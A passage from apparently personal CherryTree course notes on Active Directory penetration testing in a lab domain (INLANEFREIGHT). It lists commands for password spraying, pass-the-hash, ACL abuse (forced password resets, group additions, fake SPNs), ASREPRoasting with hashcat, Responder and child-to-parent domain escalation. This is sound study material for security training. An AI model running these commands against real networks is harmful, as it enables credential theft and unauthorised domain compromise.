      <rich_text family="monospace" background="#000000000000">raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/lafi</rich_text>
      <rich_text background="#000000000000">

Impacket tool that automatically performs an attack that escalates from child to parent domain.</rich_text>
    </node>
    <node unique_id="59" master_id="0" name="Password Spraying &amp; Password Policies" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670959947" ts_lastsave="1670960193">
      <rich_text background="#000000000000">Command &amp; Description

</rich_text>
      <rich_text family="monospace" background="#000000000000">#!/bin/bash for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}} do echo $x; done</rich_text>
      <rich_text background="#000000000000">

Bash script used to generate </rich_text>
      <rich_text family="monospace" background="#000000000000">16,079,616</rich_text>
      <rich_text background="#000000000000"> possible username combinations from a Linux
</rich_text>
      <rich_text family="monospace" background="#000000000000">crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol</rich_text>
      <rich_text background="#000000000000">

Uses </rich_text>
      <rich_text family="monospace" background="#000000000000">CrackMapExec</rich_text>
      <rich_text background="#000000000000">and valid credentials (</rich_text>
      <rich_text family="monospace" background="#000000000000">avazquez:Password123)</rich_text>
      <rich_text background="#000000000000"> enumerate the password policy (</rich_text>
      <rich_text family="monospace" background="#000000000000">--pass-pol)</rich_text>
      <rich_text background="#000000000000"> a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">rpcclient -U "" -N 172.16.5.5</rich_text>
      <rich_text background="#000000000000">

Uses </rich_text>
      <rich_text family="monospace" background="#000000000000">rpcclient</rich_text>
      <rich_text background="#000000000000"> to discover information about the domain through </rich_text>
      <rich_text family="monospace" background="#000000000000">SMB NULL</rich_text>
      <rich_text background="#000000000000"> sessions. Performed from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">rpcclient $&gt; querydominfo</rich_text>
      <rich_text background="#000000000000">

Uses </rich_text>
      <rich_text family="monospace" background="#000000000000">rpcclient</rich_text>
      <rich_text background="#000000000000"> to enumerate the password policy in a target Windows domain from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">enum4linux -P 172.16.5.5</rich_text>
      <rich_text background="#000000000000">

Uses </rich_text>
      <rich_text family="monospace" background="#000000000000">enum4linux</rich_text>
      <rich_text background="#000000000000"> to enumerate the password policy (</rich_text>
      <rich_text family="monospace" background="#000000000000">-P)</rich_text>
      <rich_text background="#000000000000"> a target Windows domain from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">enum4linux-ng -P 172.16.5.5 -oA ilfreight</rich_text>
      <rich_text background="#000000000000">

Uses </rich_text>
      <rich_text family="monospace" background="#000000000000">enum4linux-ng</rich_text>
      <rich_text background="#000000000000"> to enumerate the password policy (</rich_text>
      <rich_text family="monospace" background="#000000000000">-P)</rich_text>
      <rich_text background="#000000000000"> a target Windows domain from a Linux-based host, then presents the output in YAML &amp; JSON saved in a file proceeding the </rich_text>
      <rich_text family="monospace" background="#000000000000">-oA</rich_text>
      <rich_text background="#000000000000"> option.

</rich_text>
      <rich_text family="monospace" background="#000000000000">ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength</rich_text>
      <rich_text background="#000000000000">

Uses </rich_text>
      <rich_text family="monospace" background="#000000000000">ldapsearch</rich_text>
      <rich_text background="#000000000000"> to enumerate the password policy in a target Windows domain from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">net accounts</rich_text>
      <rich_text background="#000000000000">

Used to enumerate the password policy in a Windows domain from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Import-Module .PowerView.ps1</rich_text>
      <rich_text background="#000000000000">

Uses the Import-Module cmd-let to import the </rich_text>
      <rich_text family="monospace" background="#000000000000">PowerView.ps1</rich_text>
      <rich_text background="#000000000000"> tool from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainPolicy</rich_text>
      <rich_text background="#000000000000">

Used to enumerate the password policy in a target Windows domain from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"</rich_text>
      <rich_text background="#000000000000">

Uses </rich_text>
      <rich_text family="monospace" background="#000000000000">enum4linux</rich_text>
      <rich_text background="#000000000000"> to discover user accounts in a target Windows domain, then leverages </rich_text>
      <rich_text family="monospace" background="#000000000000">grep</rich_text>
      <rich_text background="#000000000000"> to filter the output to just display the user from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">rpcclient -U "" -N 172.16.5.5 rpcclient $&gt; enumdomuser</rich_text>
      <rich_text background="#000000000000">

Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">crackmapexec smb 172.16.5.5 --users</rich_text>
      <rich_text background="#000000000000">

Uses </rich_text>
      <rich_text family="monospace" background="#000000000000">CrackMapExec</rich_text>
      <rich_text background="#000000000000"> to discover users (</rich_text>
      <rich_text family="monospace" background="#000000000000">--users)</rich_text>
      <rich_text background="#000000000000"> a target Windows domain from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&amp;(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "</rich_text>
      <rich_text background="#000000000000">

Uses </rich_text>
      <rich_text family="monospace" background="#000000000000">ldapsearch</rich_text>
      <rich_text background="#000000000000"> to discover users in a target Windows doman, then filters the output using </rich_text>
      <rich_text family="monospace" background="#000000000000">grep</rich_text>
      <rich_text background="#000000000000"> to show only the </rich_text>
      <rich_text family="monospace" background="#000000000000">sAMAccountName</rich_text>
      <rich_text background="#000000000000"> from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">./windapsearch.py --dc-ip 172.16.5.5 -u "" -U</rich_text>
      <rich_text background="#000000000000">

Uses the python tool </rich_text>
      <rich_text family="monospace" background="#000000000000">windapsearch.py</rich_text>
      <rich_text background="#000000000000"> to discover users in a target Windows domain from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done</rich_text>
      <rich_text background="#000000000000">

Bash one-liner used to perform a password spraying attack using </rich_text>
      <rich_text family="monospace" background="#000000000000">rpcclient</rich_text>
      <rich_text background="#000000000000"> and a list of users (</rich_text>
      <rich_text family="monospace" background="#000000000000">valid_users.txt)</rich_text>
      <rich_text background="#000000000000"> a Linux-based host. It also filters out failed attempts to make the output cleaner.

</rich_text>
      <rich_text family="monospace" background="#000000000000">kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1</rich_text>
      <rich_text background="#000000000000">

Uses </rich_text>
      <rich_text family="monospace" background="#000000000000">kerbrute</rich_text>
      <rich_text background="#000000000000"> and a list of users (</rich_text>
      <rich_text family="monospace" background="#000000000000">valid_users.txt)</rich_text>
      <rich_text background="#000000000000"> perform a password spraying attack against a target Windows domain from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +</rich_text>
      <rich_text background="#000000000000">

Uses </rich_text>
      <rich_text family="monospace" background="#000000000000">CrackMapExec</rich_text>
      <rich_text background="#000000000000"> and a list of users (</rich_text>
      <rich_text family="monospace" background="#000000000000">valid_users.txt)</rich_text>
      <rich_text background="#000000000000"> perform a password spraying attack against a target Windows domain from a Linux-based host. It also filters out logon failures using </rich_text>
      <rich_text family="monospace" background="#000000000000">grep</rich_text>
      <rich_text background="#000000000000">.

</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123</rich_text>
      <rich_text background="#000000000000">

Uses </rich_text>
      <rich_text family="monospace" background="#000000000000">CrackMapExec</rich_text>
      <rich_text background="#000000000000"> to validate a set of credentials from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +</rich_text>
      <rich_text background="#000000000000">

Uses </rich_text>
      <rich_text family="monospace" background="#000000000000">CrackMapExec</rich_text>
      <rich_text background="#000000000000"> and the -</rich_text>
      <rich_text family="monospace" background="#000000000000">-local-auth</rich_text>
      <rich_text background="#000000000000"> flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using </rich_text>
      <rich_text family="monospace" background="#000000000000">grep</rich_text>
      <rich_text background="#000000000000">.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Import-Module .DomainPasswordSpray.ps1</rich_text>
      <rich_text background="#000000000000">

Used to import the PowerShell-based tool </rich_text>
      <rich_text family="monospace" background="#000000000000">DomainPasswordSpray.ps1</rich_text>
      <rich_text background="#000000000000"> from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue</rich_text>
      <rich_text background="#000000000000">

Performs a password spraying attack and outputs (-OutFile) the results to a specified file (</rich_text>
      <rich_text family="monospace" background="#000000000000">spray_success)</rich_text>
      <rich_text background="#000000000000"> a Windows-based host.</rich_text>
    </node>
    <node unique_id="60" master_id="0" name="ACL Enumeration &amp; Tactics" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670959947" ts_lastsave="1670982926">
      <rich_text background="#000000000000">
Command &amp; Description

</rich_text>
      <rich_text family="monospace" background="#000000000000">Find-InterestingDomainAcl</rich_text>
      <rich_text background="#000000000000">

PowerView tool used to find object ACLs in the target Windows domain with modification rights set to nonbased host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Import-Module .PowerView.ps1 $sid = Convert-NameToSid wley</rich_text>
      <rich_text background="#000000000000">

Used to import PowerView and retrieve the </rich_text>
      <rich_text family="monospace" background="#000000000000">SID</rich_text>
      <rich_text background="#000000000000"> of a specific user account (</rich_text>
      <rich_text family="monospace" background="#000000000000">wley)</rich_text>
      <rich_text background="#000000000000"> a Windows

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}</rich_text>
      <rich_text background="#000000000000">

Used to find all Windows domain objects that the user has rights over by mapping the user's </rich_text>
      <rich_text family="monospace" background="#000000000000">SID</rich_text>
      <rich_text background="#000000000000"> to the </rich_text>
      <rich_text family="monospace" background="#000000000000">SecurityIdentifier</rich_text>
      <rich_text background="#000000000000"> property from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">$guid= "00299570-246d-11d0-a768-00aa006e0529" Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ?{$_.rightsGuid -eq $guid} | fl</rich_text>
      <rich_text background="#000000000000">

Used to perform a reverse search &amp; map to a </rich_text>
      <rich_text family="monospace" background="#000000000000">GUID</rich_text>
      <rich_text background="#000000000000"> value from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}</rich_text>
      <rich_text background="#000000000000">

Used to discover a domain object's ACL by performing a search based on GUID's (</rich_text>
      <rich_text family="monospace" background="#000000000000">-ResolveGUIDs)</rich_text>
      <rich_text background="#000000000000"> a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName &gt; ad_users.txt</rich_text>
      <rich_text background="#000000000000">

Used to discover a group of user accounts in a target Windows domain and add the output to a text file (</rich_text>
      <rich_text family="monospace" background="#000000000000">ad_users.txt)</rich_text>
      <rich_text background="#000000000000"> a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">foreach($line in [System.IO.File]::ReadLines("C:UsersDesktopad_users.txt")) {get-acl "AD:$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\wley'}}</rich_text>
      <rich_text background="#000000000000">

A </rich_text>
      <rich_text family="monospace" background="#000000000000">foreach loop</rich_text>
      <rich_text background="#000000000000"> used to retrieve ACL information for each domain user in a target Windows domain by feeding each list of a text file(</rich_text>
      <rich_text family="monospace" background="#000000000000">ad_users.txt)</rich_text>
      <rich_text background="#000000000000"> the </rich_text>
      <rich_text family="monospace" background="#000000000000">Get-ADUser</rich_text>
      <rich_text background="#000000000000"> cmdlet, then enumerates access rights of those users. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">$SecPassword = ConvertTo-SecureString '&lt;PASSWORD HERE&gt;' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHTwley', $SecPassword)</rich_text>
      <rich_text background="#000000000000">

Used to create a </rich_text>
      <rich_text family="monospace" background="#000000000000">PSCredential Object</rich_text>
      <rich_text background="#000000000000"> from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force</rich_text>
      <rich_text background="#000000000000">

Used to create a </rich_text>
      <rich_text family="monospace" background="#000000000000">SecureString Object</rich_text>
      <rich_text background="#000000000000"> from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose</rich_text>
      <rich_text background="#000000000000">

PowerView tool used to change the password of a specifc user (</rich_text>
      <rich_text family="monospace" background="#000000000000">damundsen)</rich_text>
      <rich_text background="#000000000000"> a target Windows domain from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members</rich_text>
      <rich_text background="#000000000000">

PowerView tool used view the members of a target security group (</rich_text>
      <rich_text family="monospace" background="#000000000000">Help Desk Level 1)</rich_text>
      <rich_text background="#000000000000"> a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose</rich_text>
      <rich_text background="#000000000000">

PowerView tool used to add a specifc user (</rich_text>
      <rich_text family="monospace" background="#000000000000">damundsen)</rich_text>
      <rich_text background="#000000000000"> a specific security group (</rich_text>
      <rich_text family="monospace" background="#000000000000">Help Desk Level 1)</rich_text>
      <rich_text background="#000000000000"> a target Windows domain from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName</rich_text>
      <rich_text background="#000000000000">

PowerView tool used to view the members of a specific security group (</rich_text>
      <rich_text family="monospace" background="#000000000000">Help Desk Level 1)</rich_text>
      <rich_text background="#000000000000"> output only the username of each member (</rich_text>
      <rich_text family="monospace" background="#000000000000">Select MemberName)</rich_text>
      <rich_text background="#000000000000"> the group from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose</rich_text>
      <rich_text background="#000000000000">

PowerView tool used create a fake </rich_text>
      <rich_text family="monospace" background="#000000000000">Service Principal Name</rich_text>
      <rich_text background="#000000000000"> given a sepecift user (</rich_text>
      <rich_text family="monospace" background="#000000000000">adunn)</rich_text>
      <rich_text background="#000000000000"> a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose</rich_text>
      <rich_text background="#000000000000">

PowerView tool used to remove the fake </rich_text>
      <rich_text family="monospace" background="#000000000000">Service Principal Name</rich_text>
      <rich_text background="#000000000000"> created during the attack from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose</rich_text>
      <rich_text background="#000000000000">

PowerView tool used to remove a specific user (</rich_text>
      <rich_text family="monospace" background="#000000000000">damundsent)</rich_text>
      <rich_text background="#000000000000"> a specific security group (</rich_text>
      <rich_text family="monospace" background="#000000000000">Help Desk Level 1)</rich_text>
      <rich_text background="#000000000000"> a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">ConvertFrom-SddlString</rich_text>
      <rich_text background="#000000000000">

PowerShell cmd-let used to covert an </rich_text>
      <rich_text family="monospace" background="#000000000000">SDDL string</rich_text>
      <rich_text background="#000000000000"> into a readable format. Performed from a Windows-based host.</rich_text>
    </node>
    <node unique_id="61" master_id="0" name="ASREPRoasting" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670959947" ts_lastsave="1670960203">
      <rich_text background="#000000000000">
Command &amp; Description

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl</rich_text>
      <rich_text background="#000000000000">

PowerView based tool used to search for the </rich_text>
      <rich_text family="monospace" background="#000000000000">DONT_REQ_PREAUTH</rich_text>
      <rich_text background="#000000000000"> value across in user accounts in a target Windows domain. Performed from a Windows
</rich_text>
      <rich_text family="monospace" background="#000000000000">.Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat</rich_text>
      <rich_text background="#000000000000">

Uses </rich_text>
      <rich_text family="monospace" background="#000000000000">Rubeus</rich_text>
      <rich_text background="#000000000000"> to perform an </rich_text>
      <rich_text family="monospace" background="#000000000000">ASEP Roasting attack</rich_text>
      <rich_text background="#000000000000"> and formats the output for </rich_text>
      <rich_text family="monospace" background="#000000000000">Hashcat</rich_text>
      <rich_text background="#000000000000">. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt</rich_text>
      <rich_text background="#000000000000">

Uses </rich_text>
      <rich_text family="monospace" background="#000000000000">Hashcat</rich_text>
      <rich_text background="#000000000000"> to attempt to crack the captured hash using a wordlist (</rich_text>
      <rich_text family="monospace" background="#000000000000">rockyou.txt)</rich_text>
      <rich_text background="#000000000000"> Performed from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt</rich_text>
      <rich_text background="#000000000000">

Enumerates users in a target Windows domain and automatically retrieves the </rich_text>
      <rich_text family="monospace" background="#000000000000">AS</rich_text>
      <rich_text background="#000000000000"> for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host.</rich_text>
    </node>
    <node unique_id="62" master_id="0" name="Enumerating Security Controls" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670959947" ts_lastsave="1670960208">
      <rich_text background="#000000000000">
Command &amp; Description

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-MpComputerStatus</rich_text>
      <rich_text background="#000000000000">

PowerShell cmd</rich_text>
      <rich_text family="monospace" background="#000000000000">Windows Defender Anti-Virus</rich_text>
      <rich_text background="#000000000000"> from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</rich_text>
      <rich_text background="#000000000000">

PowerShell cmd-let used to view </rich_text>
      <rich_text family="monospace" background="#000000000000">AppLocker</rich_text>
      <rich_text background="#000000000000"> policies from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">$ExecutionContext.SessionState.LanguageMode</rich_text>
      <rich_text background="#000000000000">

PowerShell script used to discover the </rich_text>
      <rich_text family="monospace" background="#000000000000">PowerShell Language Mode</rich_text>
      <rich_text background="#000000000000"> being used on a Windows-based host. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Find-LAPSDelegatedGroups</rich_text>
      <rich_text background="#000000000000">

A </rich_text>
      <rich_text family="monospace" background="#000000000000">LAPSToolkit</rich_text>
      <rich_text background="#000000000000"> function that discovers </rich_text>
      <rich_text family="monospace" background="#000000000000">LAPS Delegated Groups</rich_text>
      <rich_text background="#000000000000"> from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Find-AdmPwdExtendedRights</rich_text>
      <rich_text background="#000000000000">

A </rich_text>
      <rich_text family="monospace" background="#000000000000">LAPSTookit</rich_text>
      <rich_text background="#000000000000"> function that checks the rights on each computer with LAPS enabled for any groups with read access and users with </rich_text>
      <rich_text family="monospace" background="#000000000000">All Extended Rights</rich_text>
      <rich_text background="#000000000000">. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-LAPSComputers</rich_text>
      <rich_text background="#000000000000">

A </rich_text>
      <rich_text family="monospace" background="#000000000000">LAPSToolkit</rich_text>
      <rich_text background="#000000000000"> function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host.</rich_text>
    </node>
    <node unique_id="63" master_id="0" name="Initial Enumeration" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670959947" ts_lastsave="1670960214">
      <rich_text background="#000000000000">Command &amp; Description

</rich_text>
      <rich_text family="monospace" background="#000000000000">nslookup ns1.inlanefreight.com</rich_text>
      <rich_text background="#000000000000">

Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux
</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo tcpdump -i ens224</rich_text>
      <rich_text background="#000000000000">

Used to start capturing network packets on the network interface proceeding the </rich_text>
      <rich_text family="monospace" background="#000000000000">-i</rich_text>
      <rich_text background="#000000000000"> option a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo responder -I ens224 -A</rich_text>
      <rich_text background="#000000000000">

Used to start responding to &amp; analyzing </rich_text>
      <rich_text family="monospace" background="#000000000000">LLMNR</rich_text>
      <rich_text background="#000000000000">, </rich_text>
      <rich_text family="monospace" background="#000000000000">NBT-NS</rich_text>
      <rich_text background="#000000000000"> and </rich_text>
      <rich_text family="monospace" background="#000000000000">MDNS</rich_text>
      <rich_text background="#000000000000"> queries on the interface specified proceeding the </rich_text>
      <rich_text family="monospace" background="#000000000000">-I</rich_text>
      <rich_text background="#000000000000"> option and operating in </rich_text>
      <rich_text family="monospace" background="#000000000000">Passive Analysis</rich_text>
      <rich_text background="#000000000000"> mode which is activated using </rich_text>
      <rich_text family="monospace" background="#000000000000">-A</rich_text>
      <rich_text background="#000000000000">. Performed from a Linux-based host

</rich_text>
      <rich_text family="monospace" background="#000000000000">fping -asgq 172.16.5.0/23</rich_text>
      <rich_text background="#000000000000">

Performs a ping sweep on the specified network segment from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum</rich_text>
      <rich_text background="#000000000000">

Performs an nmap scan that with OS detection, version detection, script scanning, and traceroute enabled (</rich_text>
      <rich_text family="monospace" background="#000000000000">-A)</rich_text>
      <rich_text background="#000000000000"> on a list of hosts (</rich_text>
      <rich_text family="monospace" background="#000000000000">hosts.txt)</rich_text>
      <rich_text background="#000000000000"> in the file proceeding </rich_text>
      <rich_text family="monospace" background="#000000000000">-iL</rich_text>
      <rich_text background="#000000000000">. Then outputs the scan results to the file specified after the </rich_text>
      <rich_text family="monospace" background="#000000000000">-oN</rich_text>
      <rich_text background="#000000000000">option. Performed from a Linux-based host

</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo git clone https://github.com/ropnop/kerbrute.git</rich_text>
      <rich_text background="#000000000000">

Uses </rich_text>
      <rich_text family="monospace" background="#000000000000">git</rich_text>
      <rich_text background="#000000000000"> to clone the kerbrute tool from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">make help</rich_text>
      <rich_text background="#000000000000">

Used to list compiling options that are possible with </rich_text>
      <rich_text family="monospace" background="#000000000000">make</rich_text>
      <rich_text background="#000000000000"> from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo make all</rich_text>
      <rich_text background="#000000000000">

Used to compile a </rich_text>
      <rich_text family="monospace" background="#000000000000">Kerbrute</rich_text>
      <rich_text background="#000000000000"> binary for multiple OS platforms and CPU architectures.

</rich_text>
      <rich_text family="monospace" background="#000000000000">./kerbrute_linux_amd64</rich_text>
      <rich_text background="#000000000000">

Used to test the chosen complied </rich_text>
      <rich_text family="monospace" background="#000000000000">Kebrute</rich_text>
      <rich_text background="#000000000000"> binary from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute</rich_text>
      <rich_text background="#000000000000">

Used to move the </rich_text>
      <rich_text family="monospace" background="#000000000000">Kerbrute</rich_text>
      <rich_text background="#000000000000"> binary to a directory can be set to be in a Linux user's path. Making it easier to use the tool.

</rich_text>
      <rich_text family="monospace" background="#000000000000">./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results</rich_text>
      <rich_text background="#000000000000">

Runs the Kerbrute tool to discover usernames in the domain (</rich_text>
      <rich_text family="monospace" background="#000000000000">INLANEFREIGHT.LOCAL)</rich_text>
      <rich_text background="#000000000000"> proceeding the </rich_text>
      <rich_text family="monospace" background="#000000000000">-d</rich_text>
      <rich_text background="#000000000000"> option and the associated domain controller specified proceeding </rich_text>
      <rich_text family="monospace" background="#000000000000">--dc</rich_text>
      <rich_text background="#000000000000">using a wordlist and outputs (</rich_text>
      <rich_text family="monospace" background="#000000000000">-o)</rich_text>
      <rich_text background="#000000000000"> results to a specified file. Performed from a Linux-based host.</rich_text>
    </node>
    <node unique_id="64" master_id="0" name="Privileged Access" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670959947" ts_lastsave="1670982897">
      <rich_text background="#000000000000">
Command &amp; Description

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"</rich_text>
      <rich_text background="#000000000000">

PowerView based tool to used to enumerate the </rich_text>
      <rich_text family="monospace" background="#000000000000">Remote Desktop Users</rich_text>
      <rich_text background="#000000000000"> group on a Windows target (</rich_text>
      <rich_text family="monospace" background="#000000000000">-ComputerName ACADEMY-EA-MS01)</rich_text>
      <rich_text background="#000000000000"> a Windows

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"</rich_text>
      <rich_text background="#000000000000">

PowerView based tool to used to enumerate the </rich_text>
      <rich_text family="monospace" background="#000000000000">Remote Management Users</rich_text>
      <rich_text background="#000000000000"> group on a Windows target (</rich_text>
      <rich_text family="monospace" background="#000000000000">-ComputerName ACADEMY-EA-MS01)</rich_text>
      <rich_text background="#000000000000"> a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force</rich_text>
      <rich_text background="#000000000000">

Creates a variable (</rich_text>
      <rich_text family="monospace" background="#000000000000">$password)</rich_text>
      <rich_text background="#000000000000"> equal to the password (</rich_text>
      <rich_text family="monospace" background="#000000000000">Klmcargo2)</rich_text>
      <rich_text background="#000000000000"> a user from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHTforend", $password)</rich_text>
      <rich_text background="#000000000000">

Creates a variable (</rich_text>
      <rich_text family="monospace" background="#000000000000">$cred)</rich_text>
      <rich_text background="#000000000000"> equal to the username (</rich_text>
      <rich_text family="monospace" background="#000000000000">forend)</rich_text>
      <rich_text background="#000000000000"> password (</rich_text>
      <rich_text family="monospace" background="#000000000000">$password)</rich_text>
      <rich_text background="#000000000000"> a target domain account from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred</rich_text>
      <rich_text background="#000000000000">

Uses the PowerShell cmd-let </rich_text>
      <rich_text family="monospace" background="#000000000000">Enter-PSSession</rich_text>
      <rich_text background="#000000000000"> to establish a PowerShell session with a target over the network (</rich_text>
      <rich_text family="monospace" background="#000000000000">-ComputerName ACADEMY-EA-DB01)</rich_text>
      <rich_text background="#000000000000"> a Windows-based host. Authenticates using credentials made in the 2 commands shown prior (</rich_text>
      <rich_text family="monospace" background="#000000000000">$cred</rich_text>
      <rich_text background="#000000000000"> &amp; </rich_text>
      <rich_text family="monospace" background="#000000000000">$password)</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000">evil-winrm -i 10.129.201.234 -u forend</rich_text>
      <rich_text background="#000000000000">

Used to establish a PowerShell session with a Windows target from a Linux-based host using </rich_text>
      <rich_text family="monospace" background="#000000000000">WinRM</rich_text>
      <rich_text background="#000000000000">.

</rich_text>
